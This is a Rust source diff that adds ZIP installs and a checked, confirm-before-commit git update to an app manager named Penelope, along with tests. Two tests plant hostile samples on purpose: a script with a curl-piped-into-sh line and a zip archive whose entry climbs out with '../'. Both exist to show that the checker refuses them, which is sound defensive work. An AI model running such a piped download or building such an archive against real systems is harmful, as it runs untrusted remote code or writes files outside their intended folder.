@@ -382,7 +382,7 @@ pub fn remove(ctx: &Ctx, name: &str) -> Result<String, String> {
 pub fn list(ctx: &Ctx) -> String {
     let apps = installed(ctx);
     if apps.is_empty() {
-        return "no app installed. /app install LINK|DIR installs one from a folder with .penelope-app.json or app.json.\n".to_string();
+        return "no app installed. /app install LINK|DIR|ZIP installs one from a folder, a ZIP or a git link with .penelope-app.json or app.json.\n".to_string();
     }
     let active = active(ctx);
     let mut out = String::from("Apps\n\n");
@@ -393,7 +393,7 @@ pub fn list(ctx: &Ctx) -> String {
             out.push_str(&format!("    {}\n", app.description.chars().take(140).collect::<String>()));
         }
     }
-    out.push_str("\n/app opens the launcher. /app on NAME chooses the app the launcher marks, /app off clears it.\n");
+    out.push_str("\n/app opens the launcher. /app update NAME pulls a git app after a check and a yes. /app on NAME chooses the app the launcher marks, /app off clears it.\n");
     out
 }
 
@@ -597,7 +597,7 @@ pub fn open_in_browser(app: &App) -> Result<String, String> {
     }
 }
 
-/// One checked install that waits for the yes. Nothing is in `.penelope/apps/NAME` before `commit`.
+/// One checked install or update that waits for the yes. Nothing is in `.penelope/apps/NAME` before `commit`.
 #[derive(Debug)]
 pub struct Prepared {
     pub app: App,
@@ -605,12 +605,21 @@ pub struct Prepared {
     pub staging: PathBuf,
     pub target: PathBuf,
     pub check: String,
+    /// True when `commit` replaces the installed folder instead of creating it.
+    pub update: bool,
+    /// The version that was installed before an update, for the report.
+    pub version_before: Option<String>,
 }
 
 impl Prepared {
     /// The report a person reads before the yes: app, view, rights, source and how much the check read.
     pub fn report(&self) -> String {
         let mut out = format!("name:     {} {}\n", self.app.name, self.app.version);
+        if let Some(before) = &self.version_before {
+            if before != &self.app.version {
+                out.push_str(&format!("update:   {} -> {}\n", before, self.app.version));
+            }
+        }
         if !self.app.description.is_empty() {
             out.push_str(&format!("about:    {}\n", self.app.description));
         }
@@ -632,6 +641,11 @@ fn is_remote(target: &str) -> bool {
 }
 
 fn copy_tree(from: &Path, to: &Path) -> Result<usize, String> {
+    copy_tree_with(from, to, false)
+}
+
+/// Copies a folder. `keep_git` keeps `.git`, which a staging copy of a git install needs for `git pull`.
+fn copy_tree_with(from: &Path, to: &Path, keep_git: bool) -> Result<usize, String> {
     fs::create_dir_all(to).map_err(|e| format!("cannot make {}: {}", to.display(), e))?;
     let mut files = 0usize;
     let mut bytes = 0u64;
@@ -649,7 +663,7 @@ fn copy_tree(from: &Path, to: &Path) -> Result<usize, String> {
                 continue;
             }
             if meta.is_dir() {
-                if COPY_SKIP_DIRS.contains(&name.as_str()) {
+                if COPY_SKIP_DIRS.contains(&name.as_str()) && !(keep_git && name == ".git") {
                     continue;
                 }
                 let next = dst.join(&name);
@@ -682,21 +696,86 @@ fn git_clone(target: &str, staging: &Path) -> Result<(), String> {
     Ok(())
 }
 
-fn config_grants(ctx: &Ctx, app: &App) -> Result<(), String> {
+fn config_grants(ctx: &Ctx, app: &App, verb: &str) -> Result<(), String> {
     let section = &ctx.cfg["apps"];
     let config = crate::files::show(&ctx.root.join("config.json"));
     if !section["allow_install"].as_bool().unwrap_or(false) {
-        return Err(format!("NOT installed. No person can answer yes here. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
-                           config));
+        return Err(format!("NOT {}. No person can answer yes here. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
+                           verb, config));
     }
     let allowed = Rights::parse(&section["rights"]);
     let missing = app.rights.missing_from(allowed);
     if !missing.is_empty() {
-        return Err(format!("NOT installed. app {} asks for the right{} {} and no person can grant {} here. Add {} under \"apps\": {{\"rights\": ...}} in {}.",
-                           app.name, if missing.len() == 1 { "" } else { "s" }, missing.join(", "),
+        return Err(format!("NOT {}. app {} asks for the right{} {} and no person can grant {} here. Add {} under \"apps\": {{\"rights\": ...}} in {}.",
+                           verb, app.name, if missing.len() == 1 { "" } else { "s" }, missing.join(", "),
                            if missing.len() == 1 { "it" } else { "them" }, missing.join(", "), config));
     }
     Ok(())
+}
+
+fn zip_target(target: &str) -> bool {
+    let path = target.split(['?', '#']).next().unwrap_or(target).to_ascii_lowercase();
+    path.ends_with(".zip")
+}
+
+/// A folder name for the staging area from a ZIP path or link. The manifest decides the final name later.
+fn zip_leaf(target: &str) -> String {
+    let path = target.split(['?', '#']).next().unwrap_or(target).trim_end_matches('/');
+    let leaf = path.rsplit('/').next().unwrap_or("app");
+    let leaf = leaf.strip_suffix(".zip").or_else(|| leaf.strip_suffix(".ZIP")).unwrap_or(leaf);
+    let leaf = safe(leaf);
+    if leaf.is_empty() { "app".to_string() } else { leaf }
+}
+
+/// Unpacks a ZIP into a hidden staging folder below `.penelope/apps`. A single wrapping folder in the archive becomes
+/// the staging folder itself, so the manifest is found at its root.
+fn stage_zip(ctx: &Ctx, archive: &Path, leaf: &str) -> Result<PathBuf, String> {
+    let base = apps_dir(ctx);
+    fs::create_dir_all(&base).map_err(|e| format!("NOT installed. cannot make {}: {}", base.display(), e))?;
+    let container = base.join(format!(".{}-unpack-{}", safe(leaf), stamp()));
+    let unpacked = crate::files::extract_zip(archive, &container)
+        .map_err(|e| format!("NOT installed. {}", e.trim_start_matches("NOT unpacked. ")))?;
+    let root = unpacked.top.clone().unwrap_or_else(|| container.clone());
+    if root == container {
+        return Ok(container);
+    }
+    let staging = base.join(format!(".{}-install-{}", safe(leaf), stamp()));
+    if let Err(e) = fs::rename(&root, &staging) {
+        cleanup(&container);
+        return Err(format!("NOT installed. the unpacked folder could not be staged: {}", e));
+    }
+    cleanup(&container);
+    Ok(staging)
+}
+
+/// Unpacks a ZIP path or a ZIP link. `file://` is read locally; http(s) is downloaded to the temp folder and removed
+/// after unpacking. Redirects are never followed, as everywhere in Penelope.
+fn stage_zip_from_target(ctx: &Ctx, target: &str, leaf: &str) -> Result<PathBuf, String> {
+    if let Some(path) = target.strip_prefix("file://") {
+        let archive = PathBuf::from(path);
+        if !archive.is_file() {
+            return Err(format!("NOT installed. {} is no ZIP file.", archive.display()));
+        }
+        return stage_zip(ctx, &archive, leaf);
+    }
+    let tmp = std::env::temp_dir().join(format!("penelope-app-{}-{}.zip", std::process::id(), stamp()));
+    let result = (|| -> Result<PathBuf, String> {
+        let response = match crate::net::agent(60).get(target).call() {
+            Ok(r) if (200..300).contains(&r.status()) => r,
+            Ok(r) => return Err(format!("NOT installed. The server answered with {}.", r.status())),
+            Err(e) => return Err(format!("NOT installed. The ZIP could not be loaded: {}", e)),
+        };
+        let mut bytes = Vec::new();
+        response.into_reader().take(MAX_COPY_BYTES + 1).read_to_end(&mut bytes)
+            .map_err(|e| format!("NOT installed. The ZIP could not be read: {}", e))?;
+        if bytes.len() as u64 > MAX_COPY_BYTES {
+            return Err(format!("NOT installed. The ZIP is larger than {} MB.", MAX_COPY_BYTES / 1024 / 1024));
+        }
+        fs::write(&tmp, &bytes).map_err(|e| format!("NOT installed. The ZIP could not be stored: {}", e))?;
+        stage_zip(ctx, &tmp, leaf)
+    })();
+    let _ = fs::remove_file(&tmp);
+    result
 }
 
 /// Copies or clones an app, runs the install check and returns it with its rights. `unattended` is the `--yes` path:
@@ -704,12 +783,13 @@ fn config_grants(ctx: &Ctx, app: &App) -> Result<(), String> {
 pub fn prepare(ctx: &Ctx, target: &str, unattended: bool) -> Result<Prepared, String> {
     let target = target.trim().trim_matches(|c| c == '"' || c == '\'');
     if target.is_empty() {
-        return Err("NOT installed. Give a git link or a folder: /app install LINK|DIR".to_string());
+        return Err("NOT installed. Give a git link, a folder or a ZIP: /app install LINK|DIR|ZIP".to_string());
     }
     let base = apps_dir(ctx);
     fs::create_dir_all(&base).map_err(|e| format!("NOT installed. cannot make {}: {}", base.display(), e))?;
 
     let local = !is_remote(target) && Path::new(target).is_dir();
+    let local_zip = !is_remote(target) && Path::new(target).is_file() && zip_target(target);
     let (staging, source) = if local {
         let src = PathBuf::from(target);
         let src = fs::canonicalize(&src).map_err(|_| format!("NOT installed. {} is no folder and no link.", target))?;
@@ -724,6 +804,13 @@ pub fn prepare(ctx: &Ctx, target: &str, unattended: bool) -> Result<Prepared, St
             return Err(format!("NOT installed. {}", e));
         }
         (staging, src.display().to_string())
+    } else if local_zip {
+        let src = fs::canonicalize(target).map_err(|_| format!("NOT installed. {} is no ZIP file.", target))?;
+        let staging = stage_zip(ctx, &src, &zip_leaf(target))?;
+        (staging, src.display().to_string())
+    } else if is_remote(target) && zip_target(target) {
+        let staging = stage_zip_from_target(ctx, target, &zip_leaf(target))?;
+        (staging, target.to_string())
     } else if is_remote(target) {
         let leaf = target.trim_end_matches('/').rsplit('/').next().unwrap_or("app").trim_end_matches(".git");
         let staging = base.join(format!(".{}-clone-{}", safe(leaf), stamp()));
@@ -733,7 +820,7 @@ pub fn prepare(ctx: &Ctx, target: &str, unattended: bool) -> Result<Prepared, St
         }
         (staging, target.to_string())
     } else {
-        return Err(format!("NOT installed. {} is no folder and no git link.", target));
+        return Err(format!("NOT installed. {} is no folder, ZIP file or git link.", target));
     };
 
     let checked = crate::plugins::check(&staging);
@@ -756,16 +843,121 @@ pub fn prepare(ctx: &Ctx, target: &str, unattended: bool) -> Result<Prepared, St
                            app.name, crate::files::show(&final_dir), app.name));
     }
     if unattended {
-        if let Err(e) = config_grants(ctx, &app) {
+        if let Err(e) = config_grants(ctx, &app, "installed") {
             cleanup(&staging);
             return Err(e);
         }
     }
-    Ok(Prepared { app, source, staging, target: final_dir, check: checked.summary() })
+    Ok(Prepared { app, source, staging, target: final_dir, check: checked.summary(), update: false, version_before: None })
+}
+
+/// Stages an update of a git-installed app: copy the installed folder with `.git`, `git pull --ff-only` there, check
+/// the result. The live folder is not touched before `commit`; a refused pull or check removes the copy.
+pub fn prepare_update(ctx: &Ctx, name: &str, unattended: bool) -> Result<Prepared, String> {
+    let app = find(ctx, name).ok_or_else(|| format!("no app named {}. /app list shows the names.", name.trim()))?;
+    let base = fs::canonicalize(apps_dir(ctx)).unwrap_or_else(|_| apps_dir(ctx));
+    if !app.dir.starts_with(&base) {
+        return Err(format!("NOT updated. {} is not below {}", app.dir.display(), base.display()));
+    }
+    if !app.dir.join(".git").exists() {
+        return Err(format!("NOT updated. app {} was not installed from git, so it has no source to pull. \
+                            A ZIP or folder app is replaced with /app remove and /app install.", app.name));
+    }
+    let staging = base.join(format!(".{}-update-{}", safe(&app.folder), stamp()));
+    if let Err(e) = copy_tree_with(&app.dir, &staging, true) {
+        cleanup(&staging);
+        return Err(format!("NOT updated. {}", e));
+    }
+    let out = match Command::new("git").args(["-C", &staging.to_string_lossy(), "pull", "--ff-only"]).output() {
+        Ok(o) => o,
+        Err(e) => {
+            cleanup(&staging);
+            return Err(format!("NOT updated. git could not start: {}", e));
+        }
+    };
+    if !out.status.success() {
+        cleanup(&staging);
+        return Err(format!("NOT updated. git pull said: {}. The installed app {} stays untouched.",
+                           String::from_utf8_lossy(&out.stderr).trim().chars().take(300).collect::<String>(), app.name));
+    }
+    let checked = crate::plugins::check(&staging);
+    if let Some(refusal) = checked.refusal("updated") {
+        cleanup(&staging);
+        return Err(format!("{}\nThe installed app {} stays untouched.", refusal, app.name));
+    }
+    let mut updated = match load_dir(&staging) {
+        Ok(app) => app,
+        Err(e) => {
+            cleanup(&staging);
+            return Err(format!("NOT updated. {}", e));
+        }
+    };
+    if updated.name != app.name {
+        cleanup(&staging);
+        return Err(format!("NOT updated. The manifest now names the app {} instead of {}. Remove and install it again.",
+                           updated.name, app.name));
+    }
+    updated.folder = app.folder.clone();
+    updated.dir = app.dir.clone();
+    updated.source = app.source.clone();
+    if unattended {
+        if let Err(e) = config_grants(ctx, &updated, "updated") {
+            cleanup(&staging);
+            return Err(e);
+        }
+    }
+    Ok(Prepared { app: updated, source: app.source, staging, target: app.dir, check: checked.summary(),
+                  update: true, version_before: Some(app.version) })
+}
+
+fn commit_update(ctx: &Ctx, prepared: Prepared) -> Result<String, String> {
+    let base = fs::canonicalize(apps_dir(ctx)).unwrap_or_else(|_| apps_dir(ctx));
+    let target = fs::canonicalize(&prepared.target).unwrap_or_else(|_| prepared.target.clone());
+    if !target.is_dir() {
+        cleanup(&prepared.staging);
+        return Err(format!("NOT updated. the installed folder {} is gone. /app install again.", prepared.target.display()));
+    }
+    if !target.starts_with(&base) {
+        cleanup(&prepared.staging);
+        return Err(format!("NOT updated. {} is not below {}", target.display(), base.display()));
+    }
+    let backup = base.join(format!(".{}-backup-{}", safe(&prepared.app.folder), stamp()));
+    if let Err(e) = fs::rename(&target, &backup) {
+        cleanup(&prepared.staging);
+        return Err(format!("NOT updated. the old folder could not be moved aside: {}", e));
+    }
+    if let Err(e) = fs::rename(&prepared.staging, &target) {
+        let _ = fs::rename(&backup, &target);
+        cleanup(&prepared.staging);
+        return Err(format!("NOT updated. the checked copy could not be moved to {}: {}", target.display(), e));
+    }
+    let mut app = prepared.app;
+    app.dir = target.clone();
+    let before = prepared.version_before.clone().unwrap_or_default();
+    let mut reg = registry(ctx);
+    reg["sources"][app.folder.as_str()] = json!(prepared.source);
+    if let Err(e) = save_registry(ctx, &reg) {
+        let failed = base.join(format!(".{}-failed-{}", safe(&app.folder), stamp()));
+        if fs::rename(&target, &failed).is_ok() {
+            let _ = fs::rename(&backup, &target);
+            cleanup(&failed);
+            return Err(format!("NOT updated. the new folder was taken back; its source could not be recorded: {}", e));
+        }
+        return Err(format!("app {} is updated at {} but its source could not be recorded: {}. The old folder stays at {}.",
+                           app.name, crate::files::show(&app.dir), e, crate::files::show(&backup)));
+    }
+    cleanup(&backup);
+    let version = if before.is_empty() || before == app.version { app.version.clone() } else { format!("{} -> {}", before, app.version) };
+    Ok(format!("app {} {} updated · view {} · rights {}\n{}\ncheck: {}\n/app on {} chooses it; /app opens the launcher.",
+               app.name, version, app.view.name(), app.rights.summary(),
+               crate::files::show(&app.dir), prepared.check.trim_start_matches("check: "), app.name))
 }
 
 /// Puts a checked app into `.penelope/apps/NAME` and records its source. Only this step writes into the app folder.
 pub fn commit(ctx: &Ctx, prepared: Prepared) -> Result<String, String> {
+    if prepared.update {
+        return commit_update(ctx, prepared);
+    }
     if prepared.target.exists() {
         cleanup(&prepared.staging);
         return Err(format!("NOT installed. {} already exists. /app remove {} first.", prepared.target.display(), prepared.app.name));
@@ -802,13 +994,24 @@ pub fn commit(ctx: &Ctx, prepared: Prepared) -> Result<String, String> {
 /// The no of the install question: the checked copy disappears, the source folder stays untouched.
 pub fn cancel(prepared: Prepared) -> String {
     let name = prepared.app.name.clone();
+    let update = prepared.update;
     cleanup(&prepared.staging);
-    format!("app {} was not installed · the checked copy was removed", name)
+    if update {
+        format!("app {} was not updated · the checked copy was removed and the old app stays", name)
+    } else {
+        format!("app {} was not installed · the checked copy was removed", name)
+    }
 }
 
 /// Install without a question, for tests and scripts. The caller must have checked the rights with `prepare`.
 pub fn install(ctx: &Ctx, target: &str, unattended: bool) -> Result<String, String> {
     let prepared = prepare(ctx, target, unattended)?;
+    commit(ctx, prepared)
+}
+
+/// Update without a question, for tests and scripts. `unattended` needs the same agreement as an install.
+pub fn update(ctx: &Ctx, name: &str, unattended: bool) -> Result<String, String> {
+    let prepared = prepare_update(ctx, name, unattended)?;
     commit(ctx, prepared)
 }
 
@@ -829,7 +1032,7 @@ pub fn cli(ctx: &Ctx, args: &[String]) -> Result<String, String> {
                 }
             }
             if target.is_empty() {
-                return Err("usage: penelope app install LINK|DIR [--yes]".to_string());
+                return Err("usage: penelope app install LINK|DIR|ZIP [--yes]".to_string());
             }
             if unattended {
                 return install(ctx, &target, true);
@@ -841,6 +1044,38 @@ pub fn cli(ctx: &Ctx, args: &[String]) -> Result<String, String> {
             let prepared = prepare(ctx, &target, false)?;
             println!("{}", prepared.report());
             print!("Install {} with these rights? [y/N] ", prepared.app.name);
+            let _ = std::io::stdout().flush();
+            let mut line = String::new();
+            std::io::stdin().read_line(&mut line).map_err(|e| format!("the answer could not be read: {}", e))?;
+            if matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
+                commit(ctx, prepared)
+            } else {
+                Ok(cancel(prepared))
+            }
+        }
+        "update" => {
+            let mut unattended = false;
+            let mut name = String::new();
+            for arg in &args[1..] {
+                if arg == "--yes" {
+                    unattended = true;
+                } else if name.is_empty() {
+                    name = arg.clone();
+                }
+            }
+            if name.is_empty() {
+                return Err("usage: penelope app update NAME [--yes]".to_string());
+            }
+            if unattended {
+                return update(ctx, &name, true);
+            }
+            if !std::io::stdin().is_terminal() {
+                return Err(format!("NOT updated. A pipe cannot answer yes. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
+                                   crate::files::show(&ctx.root.join("config.json"))));
+            }
+            let prepared = prepare_update(ctx, &name, false)?;
+            println!("{}", prepared.report());
+            print!("Update {} with these rights? [y/N] ", prepared.app.name);
             let _ = std::io::stdout().flush();
             let mut line = String::new();
             std::io::stdin().read_line(&mut line).map_err(|e| format!("the answer could not be read: {}", e))?;
@@ -877,7 +1112,7 @@ pub fn cli(ctx: &Ctx, args: &[String]) -> Result<String, String> {
                                             app.name, crate::files::show(&app.entry_path()?))),
             }
         }
-        other => Err(format!("app {} is none of list, install LINK|DIR [--yes], on NAME, off, remove NAME, show NAME", other)),
+        other => Err(format!("app {} is none of list, install LINK|DIR|ZIP [--yes], update NAME [--yes], on NAME, off, remove NAME, show NAME", other)),
     }
 }
 
@@ -907,6 +1142,35 @@ mod tests {
         fs::write(dir.join("index.html"), "<h1>hello</h1>\n").unwrap();
         fs::write(dir.join("setup.sh"), "#!/bin/sh\necho hello\n").unwrap();
         dir
+    }
+
+    /// A git repository with an app manifest, committed once. None when git is not installed.
+    fn git_app(root: &Path, folder: &str, manifest: Value) -> Option<PathBuf> {
+        let repo = app_folder(root, folder, manifest);
+        let git = |args: &[&str]| Command::new("git").current_dir(&repo).args(args).output();
+        if !git(&["init", "-q"]).map(|o| o.status.success()).unwrap_or(false) { return None; }
+        git(&["add", "."]).ok()?;
+        let made = git(&["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", "first"]).ok()?;
+        made.status.success().then_some(repo)
+    }
+
+    fn commit_all(repo: &Path, message: &str) -> bool {
+        let git = |args: &[&str]| Command::new("git").current_dir(repo).args(args).output();
+        git(&["add", "."]).map(|o| o.status.success()).unwrap_or(false)
+            && git(&["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", message])
+                .map(|o| o.status.success()).unwrap_or(false)
+    }
+
+    fn write_zip(path: &Path, entries: &[(&str, &[u8])]) {
+        let file = fs::File::create(path).unwrap();
+        let mut zip = zip::ZipWriter::new(file);
+        let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
+        use std::io::Write;
+        for (name, data) in entries {
+            zip.start_file(*name, opts).unwrap();
+            zip.write_all(data).unwrap();
+        }
+        zip.finish().unwrap();
     }
 
     #[test]
@@ -1037,6 +1301,111 @@ mod tests {
         assert!(ctx.root.join("apps/linked/.penelope-app.json").is_file());
         let listed = list(&ctx);
         assert!(listed.contains("linked") && listed.contains("installed from a git link"), "{}", listed);
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_git_app_updates_from_a_file_repo() {
+        let (root, mut ctx) = temp("update");
+        let manifest = json!({"name": "linked", "version": "1.0.0", "view": "clusters", "description": "v1"});
+        let Some(repo) = git_app(&root, "linked", manifest) else { return; };
+        let prepared = prepare(&ctx, &format!("file://{}", repo.display()), false).unwrap();
+        commit(&ctx, prepared).unwrap();
+
+        fs::write(repo.join(MANIFEST), json!({"name": "linked", "version": "1.1.0", "view": "clusters", "description": "v2"}).to_string()).unwrap();
+        fs::write(repo.join("release.txt"), "the new file\n").unwrap();
+        assert!(commit_all(&repo, "second"));
+
+        // --yes is the same gate as an install: without the agreement the old app stays.
+        let error = prepare_update(&ctx, "linked", true).unwrap_err();
+        assert!(error.contains("allow_install"), "{}", error);
+        assert_eq!(load_dir(&ctx.root.join("apps/linked")).unwrap().version, "1.0.0");
+        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging folder stayed");
+
+        ctx.cfg["apps"] = json!({"allow_install": true, "rights": {"files": true}});
+        let prepared = prepare_update(&ctx, "linked", true).unwrap();
+        assert!(prepared.update, "an update must replace the installed folder");
+        assert!(prepared.report().contains("update:   1.0.0 -> 1.1.0"), "{}", prepared.report());
+        assert!(prepared.staging.join(".git").is_dir(), "the staging copy must carry .git for the pull");
+        let report = commit(&ctx, prepared).unwrap();
+        assert!(report.contains("app linked 1.0.0 -> 1.1.0 updated"), "{}", report);
+        let installed = load_dir(&ctx.root.join("apps/linked")).unwrap();
+        assert_eq!(installed.version, "1.1.0");
+        assert_eq!(fs::read_to_string(ctx.root.join("apps/linked/release.txt")).unwrap(), "the new file\n");
+        assert!(ctx.root.join("apps/linked/.git").is_dir(), "the update must keep the git folder");
+        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging or backup folder stayed");
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_dangerous_update_is_refused_and_leaves_the_old_app_untouched() {
+        let (root, ctx) = temp("update-danger");
+        let manifest = json!({"name": "watched", "version": "1.0.0", "view": "clusters"});
+        let Some(repo) = git_app(&root, "watched", manifest) else { return; };
+        let prepared = prepare(&ctx, &format!("file://{}", repo.display()), false).unwrap();
+        commit(&ctx, prepared).unwrap();
+
+        fs::write(repo.join(MANIFEST), json!({"name": "watched", "version": "1.1.0", "view": "clusters"}).to_string()).unwrap();
+        fs::write(repo.join("install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | sh\n").unwrap();
+        assert!(commit_all(&repo, "bad"));
+        let error = prepare_update(&ctx, "watched", false).unwrap_err();
+        assert!(error.starts_with("NOT updated"), "{}", error);
+        assert!(error.contains("a download piped into a shell") && error.contains("install.sh:2"), "{}", error);
+        assert!(error.contains("stays untouched"), "{}", error);
+        let installed = load_dir(&ctx.root.join("apps/watched")).unwrap();
+        assert_eq!(installed.version, "1.0.0", "the refused check must not replace the app");
+        assert!(!ctx.root.join("apps/watched/install.sh").exists());
+        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 1, "a staging folder stayed");
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_zip_app_is_unpacked_checked_and_installed_from_a_path_and_a_file_url() {
+        let (root, ctx) = temp("zip");
+        let archive = root.join("zipped.zip");
+        let manifest = json!({"name": "zipped", "version": "1.0.0", "entry": "index.html", "rights": {"files": true}}).to_string();
+        write_zip(&archive, &[
+            ("zipped/.penelope-app.json", manifest.as_bytes()),
+            ("zipped/index.html", b"<h1>zipped</h1>\n"),
+            ("zipped/setup.sh", b"#!/bin/sh\necho hello\n"),
+        ]);
+        let prepared = prepare(&ctx, &archive.to_string_lossy(), false).unwrap();
+        assert!(prepared.report().contains("check:    1 script file checked"), "{}", prepared.report());
+        assert!(!ctx.root.join("apps/zipped").exists(), "nothing may be installed before the yes");
+        let report = commit(&ctx, prepared).unwrap();
+        assert!(report.contains("app zipped 1.0.0 installed"), "{}", report);
+        assert_eq!(fs::read_to_string(ctx.root.join("apps/zipped/index.html")).unwrap(), "<h1>zipped</h1>\n");
+        assert!(find(&ctx, "zipped").is_some());
+
+        let archive = root.join("url-app.zip");
+        let manifest = json!({"name": "url-app", "version": "2.0.0", "view": "clusters"}).to_string();
+        write_zip(&archive, &[
+            ("bundle/.penelope-app.json", manifest.as_bytes()),
+            ("bundle/readme.txt", b"from a zip url\n"),
+        ]);
+        let prepared = prepare(&ctx, &format!("file://{}", archive.display()), false).unwrap();
+        let report = commit(&ctx, prepared).unwrap();
+        assert!(report.contains("app url-app 2.0.0 installed"), "{}", report);
+        assert!(ctx.root.join("apps/url-app/readme.txt").is_file());
+        assert_eq!(fs::read_dir(ctx.root.join("apps")).unwrap().count(), 2, "a staging folder stayed");
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_zip_entry_that_climbs_out_is_refused_and_installs_nothing() {
+        let (root, ctx) = temp("zip-slip");
+        let archive = root.join("evil.zip");
+        let manifest = json!({"name": "evil", "view": "clusters"}).to_string();
+        write_zip(&archive, &[
+            ("../escape.txt", b"outside"),
+            ("evil/.penelope-app.json", manifest.as_bytes()),
+            ("evil/index.html", b"<h1>evil</h1>\n"),
+        ]);
+        let error = prepare(&ctx, &archive.to_string_lossy(), false).unwrap_err();
+        assert!(error.starts_with("NOT installed") && error.contains("outside the target"), "{}", error);
+        assert!(!root.join("escape.txt").exists() && !ctx.root.join("apps/escape.txt").exists());
+        assert!(!ctx.root.join("apps/evil").exists());
+        assert_eq!(fs::read_dir(ctx.root.join("apps")).map(|d| d.count()).unwrap_or(0), 0, "a staging folder stayed");
         let _ = fs::remove_dir_all(&root);
     }
 
